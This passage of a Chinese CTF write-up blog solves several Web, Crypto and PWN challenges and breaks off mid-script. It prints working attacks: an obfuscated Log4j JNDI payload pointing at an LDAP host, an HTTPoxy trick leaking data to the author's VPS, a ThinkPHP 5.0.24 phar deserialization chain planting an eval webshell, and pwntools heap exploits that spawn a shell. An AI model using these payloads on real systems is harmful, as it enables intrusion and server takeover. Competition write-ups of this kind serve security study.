-o&#125;$&#123;tLipT:GjC:YGc:-m&#125;$&#123;WmRvEy:pIxR:ur:LroYD:woOzUb:-c&#125;$&#123;ye:d:sR:NsdI:-a&#125;$&#123;OyXQBo:KSC:blRvH:iMLj:DxG:-t&#125;$&#123;MOGEk:VnN:-E&#125;$&#123;nxrEv:dKbcF:iEWJOf:-c&#125;$&#123;Jd:GTm:rJ:KsWYpp:oz:-h&#125;$&#123;UjBT:hMh:-o&#125;&#125;</span><br><span class="line"></span><br><span class="line">$&#123;j$&#123;iqV:xQtVwM:-n&#125;d$&#123;WnFLI:-i&#125;$&#123;j:YxXkbc:QpCi:k:QA:-:&#125;$&#123;tuNJ:pa:vDTPc:-l&#125;dap:$&#123;mxyDc:-/&#125;/$&#123;X:A:wJfVUX:-1&#125;$&#123;u:si:TmOs:-9&#125;2$&#123;x:DGbnfN:-.&#125;$&#123;h:Ga:H:Gmiv:zYQf:-1&#125;6$&#123;dqV:KYvLFD:Edfgq:HzKoK:-8&#125;$&#123;KNzKwB:IEJiU:-.&#125;$&#123;QMgb:NTVFr:gM:-2&#125;.2$&#123;VPb:kgVqX:vMNFgF:EV:iyt:-3&#125;8:1$&#123;nOhh:uTaV:TlMnJ:J:FM:-3&#125;$&#123;zUKT:mVGhb:RHbf:ypvu:-8&#125;$&#123;y:bPcT:g:Ya:-9&#125;$&#123;EDXJQ:Eetclr:oSVeHz:J:-/&#125;To$&#123;GbLFYe:UpYi:-m&#125;cat$&#123;UaV:Mo:Fu:UDboa:ePDD:-B&#125;$&#123;uzqh:O:lxU:UFRpQk:gGbqT:-y&#125;p$&#123;l:pJeje:P:s:vjiPI:-a&#125;$&#123;LCJ:vM:Ebt:LJmS:-s&#125;$&#123;pXuvuL:oWk:kXTgAe:kml:-s&#125;$&#123;WbhDYc:u:Ne:Slcje:-/&#125;$&#123;M:-T&#125;omc$&#123;kBm:V:iVQ:-a&#125;$&#123;cYCt:-t&#125;$&#123;iGHgwi:I:-E&#125;cho&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【Flag配送中心】"><a href="#【Flag配送中心】" class="headerlink" title="【Flag配送中心】"></a>【Flag配送中心】</h3><p>HTTPoxy漏洞（CVE-2016-5385）</p>
<p>VPS上监听对应端口后，在HTTP请求包中添加Proxy头：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Proxy: http://VPS:POST/</span><br></pre></td></tr></table></figure>

<p>即可监听到Flag</p>
<h3 id="【tp】"><a href="#【tp】" class="headerlink" title="【tp】"></a>【tp】</h3><p><code>thinkphp5.0.24</code> 反序列化</p>
<p>通过网上<code>poc</code> 生成<code>phar</code> 文件后，上传</p>
<p>然后变量覆盖，传入：<code>?FILES\[file\]\[name\]=phar://【上传的phar 文件名】</code></p>
<p>触发<code>phar</code> 反序列化，生成<code>webshell</code></p>
<p><strong>生成phar 的poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">    class Windows &#123;</span><br><span class="line">        private $files = [];</span><br><span class="line"></span><br><span class="line">        public function __construct($files)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files = [$files]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think &#123;</span><br><span class="line">    abstract class Model&#123;</span><br><span class="line">        protected $append = [];</span><br><span class="line">        protected $error = null;</span><br><span class="line">        public $parent;</span><br><span class="line"></span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;parent = $output; </span><br><span class="line">            $this-&gt;append = array(&quot;xxx&quot;=&gt;&quot;getError&quot;);    </span><br><span class="line">            $this-&gt;error = $modelRelation;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model&#123;</span><br><span class="line">    use think\Model;</span><br><span class="line">    class Pivot extends Model&#123;</span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            parent::__construct($output, $modelRelation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation&#123;</span><br><span class="line">    class HasOne extends OneToOne &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model\relation &#123;</span><br><span class="line">    abstract class OneToOne</span><br><span class="line">    &#123;</span><br><span class="line">        protected $selfRelation;</span><br><span class="line">        protected $bindAttr = [];</span><br><span class="line">        protected $query;</span><br><span class="line">        function __construct($query)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;selfRelation = 0;</span><br><span class="line">            $this-&gt;query = $query;    //$query指向Query</span><br><span class="line">            $this-&gt;bindAttr = [&#x27;xxx&#x27;];// $value值，作为call函数引用的第二变量</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db &#123;</span><br><span class="line">    class Query &#123;</span><br><span class="line">        protected $model;</span><br><span class="line"></span><br><span class="line">        function __construct($model)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;model = $model; //$this-&gt;model=&gt; think\console\Output;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\console&#123;</span><br><span class="line">    class Output&#123;</span><br><span class="line">        private $handle;</span><br><span class="line">        protected $styles;</span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">            $this-&gt;handle =$handle; //$handle-&gt;think\session\driver\Memcached</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\session\driver &#123;</span><br><span class="line">    class Memcached</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handler;</span><br><span class="line"></span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handler = $handle; //$handle-&gt;think\cache\driver\File</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver &#123;</span><br><span class="line">    class File</span><br><span class="line">    &#123;</span><br><span class="line">        protected $options=null;</span><br><span class="line">        protected $tag;</span><br><span class="line"></span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;options=[</span><br><span class="line">                &#x27;expire&#x27; =&gt; 3600,</span><br><span class="line">                &#x27;cache_subdir&#x27; =&gt; false,</span><br><span class="line">                &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">                &#x27;path&#x27;  =&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;,</span><br><span class="line">                &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">            ];</span><br><span class="line">            $this-&gt;tag = &#x27;xxx&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());</span><br><span class="line">    $Output = new think\console\Output($Memcached);</span><br><span class="line">    $model = new think\db\Query($Output);</span><br><span class="line">    $HasOne = new think\model\relation\HasOne($model);</span><br><span class="line">    $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));</span><br><span class="line"></span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); </span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($window);        </span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);        </span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="【LinearEquations】"><a href="#【LinearEquations】" class="headerlink" title="【LinearEquations】"></a>【LinearEquations】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import*</span><br><span class="line">data = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]</span><br><span class="line">n = 10104483468358610819</span><br><span class="line">t = []</span><br><span class="line">for i in range(4):</span><br><span class="line">    t.append(data[i+1] - data[i])</span><br><span class="line"></span><br><span class="line">a1 = (t[2] * inverse(t[0], n) - t[3] * inverse(t[1],n)) * inverse(  (t[1]*inverse(t[0],n)-t[2]*inverse(t[1],n)) ,n) % n</span><br><span class="line">b1 = (t[3] - a1 * t[2])* inverse(t[1],n) % n</span><br><span class="line">c1 = (data[2] - data[1]*a1-data[0]*b1) % n</span><br><span class="line">print(b&#x27;cazy&#123;&#x27; + long_to_bytes(a1) + long_to_bytes(b1) + long_to_bytes(c1) + b&#x27;&#125;&#x27;)</span><br><span class="line">#cazy&#123;L1near_Equ4t1on6_1s_34sy&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【no-can-no-bb】"><a href="#【no-can-no-bb】" class="headerlink" title="【no_can_no_bb】"></a>【no_can_no_bb】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">c = b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span><br><span class="line">def pad(m):</span><br><span class="line">    tmp = 16-(len(m)%16)</span><br><span class="line">    return m + bytes([tmp for _ in range(tmp)])</span><br><span class="line"></span><br><span class="line">def decrypt(c,key):</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    return aes.decrypt(c)</span><br><span class="line"></span><br><span class="line">for i in tqdm(range(1,1&lt;&lt;20)):</span><br><span class="line">    key = pad(long_to_bytes(i))</span><br><span class="line">    m = decrypt(c,key)</span><br><span class="line">    if b&#x27;cazy&#123;&#x27; in m:</span><br><span class="line">        print(m)</span><br><span class="line">#cazy&#123;n0_c4n,bb?n0p3!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【no-cry-no-can】"><a href="#【no-cry-no-can】" class="headerlink" title="【no_cry_no_can】"></a>【no_cry_no_can】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def can_encrypt(flag,key):</span><br><span class="line">    block_len = len(flag) // len(key) + 1</span><br><span class="line">    new_key = key * block_len</span><br><span class="line">    return bytes([i^j for i,j in zip(flag,new_key)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def brute_decrypt(cip):</span><br><span class="line">    key = bytes([i^j for i,j in zip(cip,b&#x27;cazy&#123;&#x27;)])</span><br><span class="line">    print(can_encrypt(cip,key))</span><br><span class="line">c = b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span><br><span class="line">m = brute_decrypt(c) </span><br><span class="line">#cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【no-math-no-cry】"><a href="#【no-math-no-cry】" class="headerlink" title="【no_math_no_cry】"></a>【no_math_no_cry】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import*</span><br><span class="line"></span><br><span class="line">def dec(c):</span><br><span class="line">    left = 0</span><br><span class="line">    right = 1&lt;&lt;500</span><br><span class="line">    for i in range(1000):</span><br><span class="line">        tmp = (left + right)//2</span><br><span class="line">        cip = (tmp - (1&lt;&lt;500))**2 + 0x0338470</span><br><span class="line">        if c &gt; cip:</span><br><span class="line">            right = tmp</span><br><span class="line">        else:</span><br><span class="line">            left = tmp</span><br><span class="line">    return tmp</span><br><span class="line">c = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span><br><span class="line">m = long_to_bytes(dec(c))</span><br><span class="line">print(m)</span><br><span class="line">#cazy&#123;1234567890_no_m4th_n0_cRy&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【math】"><a href="#【math】" class="headerlink" title="【math】"></a>【math】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y=int(&quot;0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3&quot;,16)</span><br><span class="line">x=int(&quot;0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b&quot;,16)</span><br><span class="line">ct=int(&quot;0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386&quot;,16)</span><br><span class="line">e=int(&quot;0x10005&quot;,16)</span><br><span class="line">d=int(&quot;0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1&quot;,16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kn = e * d - 1</span><br><span class="line">count = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve(a, b, c):</span><br><span class="line">    D = b ** 2 - 4 * a * c</span><br><span class="line">    assert gmpy2.is_square(D)</span><br><span class="line">    x1 = (-b + gmpy2.isqrt(D)) // (2 * a)</span><br><span class="line">    x2 = (-b - gmpy2.isqrt(D)) // (2 * a)</span><br><span class="line">    return x1, x2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for k in range(3, e):</span><br><span class="line">    if kn % k == 0:</span><br><span class="line">        count += 1</span><br><span class="line">        phi_n = kn // k</span><br><span class="line">        a = x - 1</span><br><span class="line">        b = x * y - 1 + (x - 1) * (y - 1) - phi_n</span><br><span class="line">        c = (y - 1) * (x * y - 1)</span><br><span class="line">        try:</span><br><span class="line">            k1, k2 = solve(a, b, c)</span><br><span class="line">            if (x * y - 1) % k1 == 0:</span><br><span class="line">                k2 = (x * y - 1) // k1</span><br><span class="line">            elif (x * y - 1) % k2 == 0:</span><br><span class="line">                k1, k2 = k2, (x * y - 1) // k2</span><br><span class="line">            else:</span><br><span class="line">                assert False</span><br><span class="line">            p, q = x + k2, y + k1</span><br><span class="line">            N = p * q</span><br><span class="line"></span><br><span class="line">            flag = long_to_bytes(pow(ct, d, N)).strip()</span><br><span class="line">            break</span><br><span class="line">        except AssertionError:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="【pwn1】"><a href="#【pwn1】" class="headerlink" title="【pwn1】"></a>【pwn1】</h3><p>pwn签到题，唯一有点坑就是在出函数时并不仅仅是leave；ret，而是多出了两行汇编代码。因此需要我们分析和调试一下。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXgzcHS41xmZaSiahNqF8siakyiaqVYuQwOYlkuzicuGzvg5cyMJS5Rubiazg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;pwn1&#x27;)</span><br><span class="line">io.recvuntil(&quot;:&quot;)</span><br><span class="line">stack = int(io.recv(10),16)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(&#x27;a&#x27;*0x30+p32(0x8048540)+p32(stack+0x34))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="【pwn2】"><a href="#【pwn2】" class="headerlink" title="【pwn2】"></a>【pwn2】</h3><p>libc-2.27的off-by-one，细心一点就能发现for循环这块会让我们多输入一个字节。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXkjMubxmZ3VxENIJdqIGPY68CFQok4OdQy1W8q9Yph9gwmEssjkAUvw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn2&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn2&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;size: &#x27;,str(size))</span><br><span class="line"> io.sendafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"> io.sendlineafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#0</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#1</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#2</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#3</span><br><span class="line"> add(0x18,&#x27;f1ag\n&#x27;)#4</span><br><span class="line"> dele(2)</span><br><span class="line"> add(0xf8,&#x27;a&#x27;*0xf0+p64(0x300)+&#x27;\n&#x27;)#2</span><br><span class="line"></span><br><span class="line"> for i in range(7):</span><br><span class="line">  add(0xf8,&#x27;a\n&#x27;)#5~11</span><br><span class="line"> for i in range(7):</span><br><span class="line">  dele(11-i)</span><br><span class="line"> </span><br><span class="line"> dele(0)</span><br><span class="line"> gdb.attach(io)</span><br><span class="line"> dele(3)</span><br><span class="line"> for i in range(7):</span><br><span class="line">  add(0xf8,&#x27;f1ag\n&#x27;)#0,3,5~9</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#10</span><br><span class="line"> show(1)</span><br><span class="line"> malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line"> libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line"> print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"> free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line"> system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line"></span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#11=1</span><br><span class="line"> dele(1)</span><br><span class="line"> edit(11,p64(free_hook-8)+&#x27;\n&#x27;)</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#1</span><br><span class="line"> add(0xf8,&#x27;/bin/sh\x00&#x27;+p64(system)+&#x27;\n&#x27;)#12</span><br><span class="line"> dele(12)</span><br><span class="line"> io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="【pwn3】"><a href="#【pwn3】" class="headerlink" title="【pwn3】"></a>【pwn3】</h3><p>这个题利用的是strcpy、strcat等一些对字符串操作的函数的漏洞，当他们复制字符串的时候会把字符串的最后一个字节\x00给带上，极容易造成off-by-null漏洞。而这个题的漏洞点正在于此，\x00正好将存放长度的地址覆盖置0，就可以将长度的值改写为一个很大的值，打败boss进入到奖励函数中。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXIayuycOOia65healhTqkm9aQLpzGwJib4XuzMvicSibibabKm3SFibahq13g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>因为有exit函数，很容易联想到打exit_hook。[exit_hook的知识点]( PWN学习—exit_hook-偷家 - BlackBird’s Blog (blackbird-bb.github.io) ) 参考这位西电大佬写的博客，然后直接打onegadget就ok了。在打one_gadget的时候正常出来的四个gadget不能打通，这时候在one_gadget后加上-l2可以找到更多的gadget。</p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span 